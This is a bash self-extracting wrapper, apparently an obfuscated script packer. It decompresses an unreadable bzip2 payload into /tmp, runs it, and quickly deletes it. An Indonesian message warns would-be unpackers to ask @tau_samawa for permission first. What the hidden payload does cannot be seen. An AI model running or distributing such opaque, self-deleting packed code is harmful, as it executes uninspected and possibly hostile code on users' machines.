#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�Bm�  �߀ �}��;%\����Pm &�gl��"h�#AM�'�=4����L�=C�S���2��i�@  h$H�S j�I�4 z�  @� �0�M0  �4�0�OQ�4yCLF�     ���ݪ�m�In��WG�G����͞�E	Eu�=�Iҩ�����Lq�J�8Fc?a�?�}u�)L���\�k2/8�E��T�%��ip<�7�k6�.��XH�u�k��%�*Wt��]5�E�:BT�Cg%�;�������#��b �.9�}`)���kq5���'x��n�;�:*����~�F�?�h@���dUa������5D�.��ճg���@���]{�}��f����
[8��%�ꌄ��6�E���a�Nڸ�4�n�}� �P�#�� q�8�jw�1����]5<�*�v�C{% �ĭ���%��@
cʚ�r�৔M����4�����5|�+9�C1:Ai� h��}Cl�^nq/s�ڳX�VĘ�az�u� ���6��P���o�z���G�B�~#Ɏ���v_����l�lB5�H\e�t�=4��Xgf�Ԏ(�d�8l  �k
7ȁ�:O�Q@�bH���ݰt�m����������cT����,�QS��)��nыd�5t��P�϶�W��#՗ch�l�&�8�T�a5:j�QQ���1��SI�y8J���Prr���)̺I���`Q%m���6uzo�V�nе����%�0��.
�����X^�S��U c��` ,@�`�U��ȸ�:y���ᥩ�SW�-�0z���v�0��t&��B4:Fc}j$��Z�v�6�\&�c#�,���".���.��A/��J.C>�� (c��+���3nm�D[�:8b�<1e0��v,A�w��BY=������T�A�i��Uf?e4�g�J�Q�doK��Q��|�y`WF䴼ͤ��\�ݎ	$sN�1��P4��O��#\��7{ZP�j,�)��Eה�tM%^
�6J@Ɂ�k���.0
k�E '��&	i�B��=����p��m�E� n�__�`�Mn��Y]�[g]��V�6-�2�3[زu��zP�Gj���"�(HY�6� 